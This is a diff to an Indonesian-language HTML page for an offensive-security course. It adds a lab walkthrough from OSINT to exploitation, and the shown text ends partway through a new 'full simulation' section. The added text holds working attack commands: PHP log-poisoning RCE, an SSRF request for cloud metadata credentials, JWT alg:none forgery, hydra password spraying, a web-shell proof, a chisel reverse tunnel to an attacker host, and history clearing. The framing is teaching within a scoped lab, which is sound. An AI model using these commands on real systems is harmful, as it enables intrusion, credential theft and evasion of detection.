@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'">
+  <meta name="referrer" content="no-referrer">
   <meta name="description" content="Offensive Security — teknik ethical hacking modern: kill chain, walkthrough SQL injection, serangan web, Active Directory, privilege escalation, wireless & pivoting.">
   <title>Offensive Security — CyberGuard Academy</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -93,9 +95,11 @@
         <a href="#network"><span>08</span>Serangan Jaringan</a>
         <a href="#pivoting"><span>09</span>Pivoting</a>
         <a href="#cheatsheet"><span>10</span>Cheatsheet</a>
-        <a href="#praktik"><span>11</span>Lab Serangan</a>
-        <a href="#studikasus"><span>12</span>Studi Kasus Penuh</a>
-        <a href="#checklist"><span>13</span>Checklist</a>
+        <a href="#d2e"><span>11</span>Data Gathering → Eksekusi</a>
+        <a href="#praktik"><span>12</span>Lab Serangan</a>
+        <a href="#studikasus"><span>13</span>Studi Kasus Penuh</a>
+        <a href="#checklist"><span>14</span>Checklist</a>
+        <a href="#simulasi"><span>15</span>Simulasi Penuh</a>
       </aside>
 
       <div class="layout-main">
@@ -432,11 +436,287 @@ msf6 &gt; set session 1   <span class="t-comment"># lewat sesi sebagai jembatan<
           </div>
         </section>
 
+        <!-- ============ DATA GATHERING → EKSEKUSI ============ -->
+        <section class="section" id="d2e">
+          <div class="sec-head">
+            <span class="sec-num">11 — data gathering &amp; eksekusi</span>
+            <h2 class="sec-title">Dari Data Gathering sampai <span class="accent">Eksekusi</span></h2>
+            <p class="sec-sub">Inti praktik modul offensive: bagaimana <b>pengumpulan data</b> berubah menjadi <b>eksekusi serangan</b> yang terukur. Alurnya selalu <b>pasif dulu</b> (tanpa menyentuh target), lalu <b>aktif</b> (menyentuh), baru <b>mengeksekusi</b>. Semua perintah sah di lab <code class="inline">roa.txt</code> — tiap noktah yang bisa dijalankan punya tombol <b>Jalankan</b>, sisanya transkrip siap salin.</p>
+          </div>
+
+          <h3 style="margin:34px 0 8px;color:var(--txt)">Blok A — Data Gathering: Pasif Dulu, Aktif Kemudian</h3>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>1. OSINT — Mengumpulkan Data Tanpa Menyentuh Target</h3>
+              <p>Recon pasif tidak pernah mengirim satu paket pun ke target: <code class="inline">whois</code>, <code class="inline">dig</code>, Certificate Transparency (crt.sh), Shodan, dan metadata dokumen memberi peta awal — domain, subdomain, email, dan teknologi. Di sandbox, <code class="inline">cat lab/targets.txt</code> memegang peran hasil OSINT: peta host latihan beserta peran masing-masing. Baca bersama <code class="inline">lab/roa.txt</code> agar tahu batas scope <em>sebelum</em> beraktivitas.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="cat lab/targets.txt && cat lab/roa.txt"><svg><use href="#ic-terminal"/></svg>Peta Host + Otorisasi</button>
+                <code class="run-hint">cat lab/targets.txt && cat lab/roa.txt</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="cat lab/notes.txt"><svg><use href="#ic-terminal"/></svg>Catatan Praktikum</button>
+                <code class="run-hint">cat lab/notes.txt</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">osint-pasif.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-comment"># OSINT pasif — target tidak tahu kita sedang mengamati</span>
+<span class="t-cmd">$</span> whois target.com | grep -iE 'registrar|creation|name server'
+<span class="t-dim">Registrar: ExampleDNS · Creation Date: 2010-03-11 · NS: ns1 target.com</span>
+<span class="t-cmd">$</span> dig +short A target.com &amp;&amp; dig +short MX target.com
+<span class="t-dim">203.0.113.7 · mail.target.com</span>
+<span class="t-cmd">$</span> curl -s "https://crt.sh/?q=%.target.com&amp;output=json" -o crt.json
+<span class="t-dim">[!] subdomain dari Transparency Logs — mulai dari sini petakan permukaan</span></pre></div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>2. Zone Transfer DNS — Satu Query, Seluruh Peta Internal</h3>
+              <p>Miskonfigurasi klasik: server DNS sekunder yang membolehkan <strong>AXFR</strong> akan menyerahkan seluruh record zona pada siapa saja. <code class="inline">dig axfr @ns</code> meminta salinan penuh; bila berhasil, hostname internal yang tak terindeks publik (<code class="inline">vpn</code>, <code class="inline">internal-admin</code>, dsb.) rata terbeber.</p>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">zone-transfer.dig</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-cmd">$</span> dig axfr @ns1.target.com target.com
+<span class="t-dim">;; Transfer failed. (server utama selamat — tidak mengizinkan AXFR)</span>
+<span class="t-cmd">$</span> dig axfr @ns2.target.com target.com
+<span class="t-dim">mail.target.com.       3600 IN A  10.0.2.25</span>
+<span class="t-dim">vpn.target.com.        3600 IN A  10.0.2.30</span>
+<span class="t-dim">internal-admin.target.com. 3600 IN A  10.0.2.5</span>
+<span class="t-warn">[!] NS sekunder terlalu permisif — seluruh hostname internal terbeber</span></pre></div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>3. Host Discovery — Urutan yang Benar</h3>
+              <p>Jangan langsung scan port ke semua IP sekaligus. Prinsip efisien: <code class="inline">nmap -sn</code> (ping sweep) memetakan host yang hidup dulu, lalu baru port scan mendalam ke host yang online. Di lab, <code class="inline">nmap -sn 192.168.1.10</code> mengonfirmasi target hidup dan menyebut MAC-nya — dan ingat, host peserta <code class="inline">kali-recon</code> sengaja menolak ping agar kamu terbiasa menghormati scope.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="nmap -sn 192.168.1.10"><svg><use href="#ic-terminal"/></svg>Host Discovery</button>
+                <code class="run-hint">nmap -sn 192.168.1.10</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>4. Fingerprinting Versi — Jembatan Menuju Exploit</h3>
+              <p>Versi layanan adalah kunci exploit: temuan <code class="inline">Apache/2.4.41</code> atau <code class="inline">OpenSSH 8.2p1</code> langsung dicocokkan ke CVE via <code class="inline">searchsploit</code>/basis CVE. Alurnya: <code class="inline">nmap -sV</code> untuk versi, lalu <code class="inline">searchsploit</code> untuk exploit publik yang cocok — bukan menembak sembarang payload.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="nmap -sV 192.168.1.10"><svg><use href="#ic-terminal"/></svg>Scan Versi Layanan</button>
+                <code class="run-hint">nmap -sV 192.168.1.10</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="searchsploit apache 2.4"><svg><use href="#ic-terminal"/></svg>Cocokkan CVE</button>
+                <code class="run-hint">searchsploit apache 2.4</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>5. Enumerasi Konten — Membuka Permukaan Aplikasi</h3>
+              <p><code class="inline">gobuster dir</code> memetakan direktori tersembunyi berbasis wordlist (<code class="inline">/admin</code>, <code class="inline">/backup</code>, <code class="inline">/config</code>), sedangkan <code class="inline">nikto</code> menebar temuan konfigurasi: directory listing terbuka, security headers hilang, versi usang. Hasil ini menentukan mana parameter yang layak diuji injeksi berikutnya.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="gobuster dir -u http://lab-web-01 -w /opt/lab/wordlists/directory.txt"><svg><use href="#ic-terminal"/></svg>Gobuster Dir</button>
+                <code class="run-hint">gobuster dir -u http://lab-web-01 -w /opt/lab/wordlists/directory.txt</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="nikto -h http://lab-web-01"><svg><use href="#ic-terminal"/></svg>Nikto</button>
+                <code class="run-hint">nikto -h http://lab-web-01</code>
+              </div>
+            </div>
+          </div>
+
+          <h3 style="margin:34px 0 8px;color:var(--txt)">Blok B — Eksekusi: Mengubah Data Menjadi Serangan</h3>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>6. Blind SQLi — Membaca Kebenaran Tanpa Output</h3>
+              <p>Saat hasil query tak tampil langsung, injeksi <em>buta</em> dikonfirmasi lewat <strong>perbedaan respons</strong>: halaman berubah saat <code class="inline">AND 1=1</code> vs <code class="inline">AND 1=2</code> (boolean), atau tertunda saat <code class="inline">SLEEP(5)</code> vs cepat (time-based). Sandbox memakai <code class="inline">sqlmap</code> untuk membuktikan parameter <code class="inline">id</code> injectable dan mendata database — bukti dampak tanpa perlu membeberkan seluruh data.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="sqlmap -u 'http://lab-web-01/search?id=1' --dbs --batch"><svg><use href="#ic-terminal"/></svg>SQLMap List DB</button>
+                <code class="run-hint">sqlmap -u 'http://lab-web-01/search?id=1' --dbs --batch</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">blind-boolean.sql</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-comment"># boolean-based — bandingkan dua kondisi</span>
+GET /search.php?id=1<span class="t-warn"> AND 1=1</span>  <span class="t-ok">[200] produk tampil</span>
+GET /search.php?id=1<span class="t-warn"> AND 1=2</span>  <span class="t-dim">[200] halaman kosong</span>
+<span class="t-comment"># time-based — ukur selisih waktu respons</span>
+GET /search.php?id=1<span class="t-warn">; SELECT SLEEP(5)--</span>  <span class="t-hot">[.. 5.0s] kondisi benar → injectable</span></pre></div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>7. LFI → RCE via Log Poisoning</h3>
+              <p>Kerentanan <strong>Local File Inclusion</strong> (parameter path membaca file lokal) bisa dinaikkan jadi Remote Code Execution: tanam payload PHP di <code class="inline">User-Agent</code> request, lalu <em>include</em> file log akses lewat parameter LFI. Payload di dalam log dieksekusi saat file log dirender sebagai "halaman". Traversal klasik: <code class="inline">?page=../../../../etc/passwd</code>.</p>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">lfi-to-rce.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-comment"># 1) buktikan traversal — baca /etc/passwd</span>
+<span class="t-cmd">$</span> curl 'http://lab-web-01/?page=../../../../../../etc/passwd'
+<span class="t-ok">root:x:0:0:root:/root:/bin/bash   (LFI terkonfirmasi)</span>
+<span class="t-comment"># 2) racuni log akses via User-Agent</span>
+<span class="t-cmd">$</span> curl -A '&lt;?php system($_GET["x"]); ?&gt;' http://lab-web-01/
+<span class="t-comment"># 3) include file log — payload tereksekusi</span>
+<span class="t-cmd">$</span> curl 'http://lab-web-01/?page=/var/log/apache2/access.log&amp;x=id'
+<span class="t-hot">uid=33(www-data) gid=33(www-data) — LFI berubah menjadi RCE</span></pre></div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>8. SSRF → IMDS — Mencuri Identitas Cloud</h3>
+              <p>Fitur "fetch URL" yang tidak membatasi protokol dapat diarahkan ke <strong>metadata cloud</strong> (<code class="inline">169.254.169.254</code>). pada AWS IMDSv1, endpoint itu menyerahkan <em>token kredensial sementara</em> role instance — satu SSRF bisa membuka akses cloud penuh. Selalu uji URL internal, <code class="inline">file://</code>, dan protokol non-HTTP.</p>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">ssrf-imds.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-comment"># endpoint fetch image/url tidak membatasi protokol/tujuan</span>
+<span class="t-cmd">$</span> curl 'http://app.local/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+<span class="t-dim">{"AccessKeyId":"ASI...","SecretAccessKey":"...","Token":"..."}</span>
+<span class="t-warn">[!] token role instance bocor → akses cloud lewat satu SSRF; matikan IMDSv1 &amp; validasi SSRF</span></pre></div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>9. JWT — Memalsukan Token dengan Secret Lemah</h3>
+              <p>Token JWT terdiri dari header.payload.signature dalam base64url. Uji keamanan pertama: dekode header dan periksa <code class="inline">alg</code>. Bila implementasi memercayai <code class="inline">alg=none</code>, signature bisa dihilangkan sama sekali; bila secret pendek, <code class="inline">hashcat -m 16500</code> memecahkannya offline lalu token dipalsukan bebas.</p>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">jwt-test.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-comment"># dekode header (bagian pertama token)</span>
+<span class="t-cmd">$</span> echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
+<span class="t-ok">{"alg":"HS256","typ":"JWT"}</span>
+<span class="t-comment"># uji secret pendek dengan hashcat mode 16500 (jwt)</span>
+<span class="t-cmd">$</span> hashcat -m 16500 jwt.txt /opt/lab/wordlists/passwords.txt
+<span class="t-ok">eyJhbGciOi... : admin123   — secret pecah, token bisa dipalsukan</span>
+<span class="t-comment"># uji kedua: ubah header ke alg:none — terima jika server tidak memvalidasi</span>
+<span class="t-cmd">$</span> curl -H "Authorization: Bearer <span class="t-warn">eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.</span>" http://app.local/admin</pre></div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>10. Password Spraying — Satu Kata Sandi, Banyak Akun</h3>
+              <p>Berbeda dari brute force konvensional (banyak password ke satu akun), <strong>spraying</strong> mencoba satu/beberapa password umum ke <em>banyak akun</em> — meminimalkan percobaan per akun agar kebijakan lockout tidak terpicu. Di lab, <code class="inline">hydra</code> menguji kredensial lemah terhadap layanan FTP DMZ <code class="inline">10.0.5.7</code>; akun <code class="inline">guest:guest123</code> ternyata valid.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="hydra -l guest -P /opt/lab/wordlists/passwords.txt ftp://10.0.5.7"><svg><use href="#ic-terminal"/></svg>Spray FTP DMZ</button>
+                <code class="run-hint">hydra -l guest -P /opt/lab/wordlists/passwords.txt ftp://10.0.5.7</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>11. Web Shell — Bukti Minimal yang Tidak Merusak</h3>
+              <p>Ketika upload file lolos, tujuan bukan menyebar malware: cukup membuktikan <em>eksekusi</em> dengan file uji yang tidak berbahaya (<code class="inline">proof.php</code> memanggil <code class="inline">id</code>), lalu catat output sebagai bukti. Kewajiban berikutnya adalah <strong>cleanup</strong>: hapus kembali file uji itu begitu bukti tercukupi.</p>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">webshell-proof.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-comment"># upload file uji (bukan backdoor permanen)</span>
+<span class="t-cmd">$</span> echo '&lt;?php echo "RCE-OK-".shell_exec("id"); ?&gt;' &gt; lab/proof.php
+<span class="t-cmd">$</span> curl 'http://lab-web-01/uploads/proof.php'
+<span class="t-ok">RCE-OK- uid=33(www-data) — eksekusi terkonfirmasi, bukan hanya upload</span>
+<span class="t-comment"># KEWAJIBAN: bersihkan artifact</span>
+<span class="t-cmd">$</span> rm -f lab/proof.php  <span class="t-dim"># cleanup — jejak dikembalikan bersih</span></pre></div>
+            </div>
+          </div>
+
+          <h3 style="margin:34px 0 8px;color:var(--txt)">Blok C — Post-Eksekusi: Stabil, Pivot, dan Bersih</h3>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>12. Stabilisasi TTY — Shell yang Nyaman Dikerjai</h3>
+              <p>Shell hasil reverse/exploit biasanya non-interaktif: editor, <code class="inline">sudo</code>, dan job control rusak. Langkah pertama post-exploit adalah menaikkan ke <strong>PTY penuh</strong> dengan Python pty (atau <code class="inline">script</code>), mengatur <code class="inline">TERM</code>, lalu memulihkan kontrol terminal lewat <code class="inline">stty raw -echo</code>.</p>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">stabilize-tty.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-cmd">$</span> python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="t-cmd">$</span> export TERM=xterm-256color
+<span class="t-comment"># lalu di terminal penyerang: Ctrl-Z → stty raw -echo; fg</span>
+<span class="t-dim">(ctrl-Z)  $ stty raw -echo; fg</span>
+<span class="t-ok">warna sintaks, editor, dan job control berfungsi normal</span></pre></div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>13. Pivoting &amp; Tunneling — Menjangkau Subnet Internal</h3>
+              <p>Host yang kamu kuasai menjadi <em>relay</em>: petakan segmen internal lewatnya, lalu tunnel traffic tools lokal lewat SOCKS. Di lab, <code class="inline">nmap -sV 10.0.5.7</code> memetakan DMZ dari posisi host yang sudah dikuasai; di dunia nyata gunakan chisel/Ligolo + proxychains agar nmap/hydra menjangkau jaringan yang lebih dalam.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="nmap -sV 10.0.5.7"><svg><use href="#ic-terminal"/></svg>Scan Host DMZ</button>
+                <code class="run-hint">nmap -sV 10.0.5.7</code>
+              </div>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">chisel-tunnel.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-comment"># host yang dikompromi sebagai relay SOCKS</span>
+<span class="t-dim">attacker$</span> ./chisel server -p 8080 --reverse
+<span class="t-dim">target$</span>   ./chisel client ATTACKER:8080 R:1080:socks
+<span class="t-dim">attacker$</span> proxychains nmap -sT -Pn 172.16.5.10
+<span class="t-dim">[proxychains] ... → 172.16.5.10 open ports: 22, 445, 3389</span>
+<span class="t-warn">[!] disiplin scope tetap berlaku — jangan keluar dari jaringan yang diizinkan</span></pre></div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>14. Eksfiltrasi Etis &amp; Cleanup — Menutup Engagement dengan Benar</h3>
+              <p>Data yang diambil hanya <strong>sampel minimal</strong>, dienkripsi, dan disimpan rahasia sampai laporan diserahkan — lalu dihancurkan. Engagemen ditutup dengan rangkuman bukti, <code class="inline">sha256sum</code> sebagai sidik jari integritas, rekap <code class="inline">score</code>, dan <strong>penghapusan semua artefak</strong> yang kamu tanam.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="sha256sum lab/evidence-sqli.txt && ls -la lab"><svg><use href="#ic-terminal"/></svg>Integritas &amp; Rekap Bukti</button>
+                <code class="run-hint">sha256sum lab/evidence-sqli.txt && ls -la lab</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="score"><svg><use href="#ic-terminal"/></svg>Rekap Misi</button>
+                <code class="run-hint">score</code>
+              </div>
+            </div>
+            <div class="terminal" style="margin:0">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">cleanup.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-comment"># jaga sampel data tetap terenkripsi &amp; diminimalkan</span>
+<span class="t-cmd">$</span> gpg -c lab/evidence-sqli.txt        <span class="t-dim"># enkripsi simetris sampel bukti</span>
+<span class="t-cmd">$</span> gzip -9 lab/evidence-sqli.txt.gpg
+<span class="t-comment"># hapus seluruh artefak yang kamu tanam</span>
+<span class="t-cmd">$</span> rm -f lab/proof.php uploads/shell.php lab/sqli-dump.txt.gpg.gz
+<span class="t-cmd">$</span> history -c 2&gt;/dev/null               <span class="t-dim"># sesuai Rule of Engagement</span></pre></div>
+            </div>
+          </div>
+
+          <div class="alert alert-success" style="margin-top:26px">
+            <svg><use href="#ic-flag"/></svg>
+            <div><strong>Data Gathering bukan tujuan — Eksekusi yang terukur itu tujuan</strong><p>Semakin rapi data yang dikumpulkan (OSINT → zone transfer → host discovery → fingerprinting → konten), semakin tepat serangan yang dieksekusi (blind SQLi, LFI→RCE, SSRF, JWT, spraying, web shell) dan semakin bersih post-eksekusinya (TTY, pivot, cleanup). Reruntuhan wet lab ini adalah bahan uji di <a href="#praktik">Lab Serangan</a> yang lebih panjang dari otorisasi sampai laporan.</p></div>
+          </div>
+        </section>
+
         <!-- CHECKLIST -->
         <!-- ============ PRAKTIKUM ============ -->
         <section class="section" id="praktik">
           <div class="sec-head">
-            <span class="sec-num">11 — lab serangan</span>
+            <span class="sec-num">12 — lab serangan</span>
             <h2 class="sec-title">Lab Serangan: <span class="accent">10 Langkah Estafet Penetrasi</span></h2>
             <p class="sec-sub">Jalur serangan utuh dari otorisasi sampai laporan, langkah demi langkah di terminal sandbox. Klik <b>Jalankan</b> pada tiap noktah dan ikuti alurnya berurutan — tiap langkah mewarisi hasil langkah sebelumnya, persis engagement sungguhan. Semua legal: target adalah host lab di <code class="inline">roa.txt</code>.</p>
           </div>
@@ -639,7 +919,7 @@ msf6 &gt; set session 1   <span class="t-comment"># lewat sesi sebagai jembatan<
 
         <section class="section" id="studikasus">
           <div class="sec-head">
-            <span class="sec-num">12 — studi kasus penuh</span>
+            <span class="sec-num">13 — studi kasus penuh</span>
             <h2 class="sec-title">Contoh Penuh: Satu Engagement di <span class="accent">Tujuh Lapis OSI</span></h2>
             <p class="sec-sub">Step-by-step super lengkap dalam satu skenario utuh: pentest terhadap <code class="inline">lab-web-01</code> (192.168.1.10) mulai dari otorisasi sampai bukti kemenangan, <b>dari awal sampai akhir</b>, ditelusuri naik mengikuti model OSI — <b>legalitas → bit di kabel (physical) → MAC &amp; frame (data link) → IP &amp; rute (network) → port &amp; handshake (transport) → sesi SSH (session) → cracking hash &amp; encoding (presentation) → SQLi aplikasi (application) → privesc root → klaim flag</b>. Seluruh perjalanannya tertulis utuh di <b>transkrip penuh</b> di bawah — output asli sandbox, bukan sekadar cerita — dan kamu boleh menjalankan ulang tiap langkah lewat tombol <b>Jalankan</b> pada tiap lapis.</p>
           </div>
@@ -791,7 +1071,7 @@ msf6 &gt; set session 1   <span class="t-comment"># lewat sesi sebagai jembatan<
 
         <section class="section" id="checklist">
           <div class="sec-head">
-            <span class="sec-num">13 — prosedur</span>
+            <span class="sec-num">14 — prosedur</span>
             <h2 class="sec-title">Checklist Offensive <span class="accent">Workflow</span></h2>
           </div>
           <div class="grid-3">
@@ -825,6 +1105,86 @@ msf6 &gt; set session 1   <span class="t-comment"># lewat sesi sebagai jembatan<
                 <li>De-brief dengan tim IT &amp; jadwalkan retest</li>
               </ol>
             </div>
+          </div>
+        </section>
+
+<section class="section" id="simulasi">
+          <div class="sec-head">
+            <span class="sec-num">15 — simulasi penuh</span>
+            <h2 class="sec-title">Praktek Penuh: <span class="accent">Nmap → Langsung Masuk → Sampai Root</span></h2>
+            <p class="sec-sub">Satu proses yang <strong>berkesinambungan</strong> — bukan langkah yang dijelaskan satu per satu. Hasil setiap perintah <strong>langsung dipakai</strong> sebagai input perintah berikutnya: <code class="inline">nmap</code> menemukan port terbuka, kita <strong>langsung</strong> masuk ke SSH di port itu, lalu naik hak, pivot, dan selesai setelah root. Tekan tombol secara urut, atau salin transkrip sesi penuh di bawah.</p>
+          </div>
+
+          <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:22px 0 6px;">
+            <span class="tag tag-off">nmap → port</span><span style="color:var(--mute)">&#8594;</span>
+            <span class="tag tag-rec">ssh langsung</span><span style="color:var(--mute)">&#8594;</span>
+            <span class="tag tag-amber">naik hak</span><span style="color:var(--mute)">&#8594;</span>
+            <span class="tag tag-off">pivot</span><span style="color:var(--mute)">&#8594;</span>
+            <span class="tag tag-def">root + rekap</span>
+          </div>
+
+          <div class="alert alert-info" style="margin-top:18px">
+            <svg><use href="#ic-target"/></svg>
+            <div><strong>Target dalam scope</strong><p>Pentest resmi PT CyberGuard: <code class="inline">lab-web-01 (192.168.1.10)</code> dan <code class="inline">lab-internal-01 (10.0.5.7)</code>. Izin + ROA dibaca sekali di awal (<code class="inline">lab/roa.txt</code>), sisanya kamu jalan terus sampai tuntas.</p></div>
+          </div>
+
+          <h3 style="margin:34px 0 8px;color:var(--text)"><span class="tag tag-off">One-shot flow</span>&nbsp;&nbsp;Jalankan Berurutan — Output #1 Menjadi Input #2, dst.</h3>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <p><strong>Alurnya cuma satu:</strong> peta + izin dulu (sekali), lalu <code class="inline">nmap -sV 192.168.1.10</code> menunjukkan port <code class="inline">22/ssh</code> terbuka → <strong>langsung</strong> <code class="inline">ssh webadmin@lab-web-01</code> masuk pakai port itu → <code class="inline">sudo -l</code> menyingkap <code class="inline">sudo /opt/backup.sh</code> (root) → <code class="inline">whoami</code> menegaskan root → lanjut cari <code class="inline">10.0.5.7</code>, banting FTP-nya dengan <code class="inline">hydra</code> → bukti root (<code class="inline">cat /root/root.txt</code>) → rekap <code class="inline">score</code>. Tidak ada penjelasan yang menyekat antar-perintah.</p>
+              <p><strong>Yang tetap wajib saat latihan:</strong> bacakan ROA sekali sebelum serangan, dan catat bukti (<code class="inline">sha256sum</code>) di titik penting — tapi itu satu ketukan di tengah alur, bukan sesi terpisah.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line"><span class="qnum">1</span><button class="run-btn" type="button" data-run="cat lab/targets.txt && cat lab/roa.txt"><svg><use href="#ic-terminal"/></svg>Peta + Izin</button><code class="run-hint">cat lab/targets.txt && cat lab/roa.txt</code></div>
+              <div class="run-line"><span class="qnum">2</span><button class="run-btn" type="button" data-run="nmap -sV 192.168.1.10"><svg><use href="#ic-terminal"/></svg>nmap Temukan Port</button><code class="run-hint">nmap -sV 192.168.1.10</code></div>
+              <div class="run-line"><span class="qnum">3</span><button class="run-btn" type="button" data-run="ssh webadmin@lab-web-01"><svg><use href="#ic-terminal"/></svg>Langsung SSH (port 22)</button><code class="run-hint">ssh webadmin@lab-web-01</code></div>
+              <div class="run-line"><span class="qnum">4</span><button class="run-btn" type="button" data-run="sudo -l"><svg><use href="#ic-terminal"/></svg>Cek Hak Sudo</button><code class="run-hint">sudo -l</code></div>
+              <div class="run-line"><span class="qnum">5</span><button class="run-btn" type="button" data-run="id && sudo /opt/backup.sh && whoami"><svg><use href="#ic-terminal"/></svg>Naik ke Root</button><code class="run-hint">id && sudo /opt/backup.sh && whoami</code></div>
+              <div class="run-line"><span class="qnum">6</span><button class="run-btn" type="button" data-run="ip route && nmap -sV 10.0.5.7"><svg><use href="#ic-terminal"/></svg>Pivot ke Internal</button><code class="run-hint">ip route && nmap -sV 10.0.5.7</code></div>
+              <div class="run-line"><span class="qnum">7</span><button class="run-btn" type="button" data-run="hydra -l guest -P /opt/lab/wordlists/passwords.txt ftp://10.0.5.7"><svg><use href="#ic-terminal"/></svg>Serang FTP Internal</button><code class="run-hint">hydra -l guest -P /opt/lab/wordlists/passwords.txt ftp://10.0.5.7</code></div>
+              <div class="run-line"><span class="qnum">8</span><button class="run-btn" type="button" data-run="id && whoami && cat /root/root.txt"><svg><use href="#ic-terminal"/></svg>Bukti Root + Flag</button><code class="run-hint">id && whoami && cat /root/root.txt</code></div>
+              <div class="run-line"><span class="qnum">9</span><button class="run-btn" type="button" data-run="score"><svg><use href="#ic-terminal"/></svg>Rekap Misi</button><code class="run-hint">score</code></div>
+            </div>
+          </div>
+
+          <div class="terminal" style="margin-top:6px">
